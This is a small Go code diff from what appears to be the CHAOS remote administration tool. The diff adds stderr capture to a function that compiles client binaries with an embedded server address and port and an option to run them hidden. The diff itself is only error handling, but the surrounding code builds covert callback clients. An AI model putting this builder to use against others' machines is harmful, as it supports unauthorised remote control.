@@ -8,6 +8,7 @@ import (
 	"github.com/tiagorlampert/CHAOS/pkg/color"
 	"github.com/tiagorlampert/CHAOS/pkg/system"
 	"github.com/tiagorlampert/CHAOS/pkg/util"
+	"io/ioutil"
 	"os"
 	"os/exec"
 	"strings"
@@ -47,9 +48,21 @@ func (g GenerateUseCase) BuildClientBinary(params []string) error {
 	const buildStr = `GO_ENABLED=1 GOOS=%s GOARCH=amd64 go build -tags netgo -ldflags '%s -s -w -X main.ServerPort=%s -X main.ServerAddress=%s -extldflags "-static"' -o ../%s/%s main.go`
 	cmd := exec.Command("sh", "-c", fmt.Sprintf(buildStr, buildTarget.OS, runHidden(buildTarget.Hidden), buildTarget.Port, buildTarget.Address, util.BuildDirectory, buildTarget.Filename))
 	cmd.Dir = "client/"
-	err := cmd.Run()
+	stdErr, err := cmd.StderrPipe()
 	if err != nil {
 		return err
+	}
+
+	if err := cmd.Start(); err != nil {
+		return err
+	}
+
+	outErr, err := ioutil.ReadAll(stdErr)
+	if err != nil {
+		return err
+	}
+	if len(outErr) != 0 {
+		return fmt.Errorf(string(outErr))
 	}
 
 	fmt.Println(color.Green, fmt.Sprint("[*] Generated at build/", buildTarget.Filename))
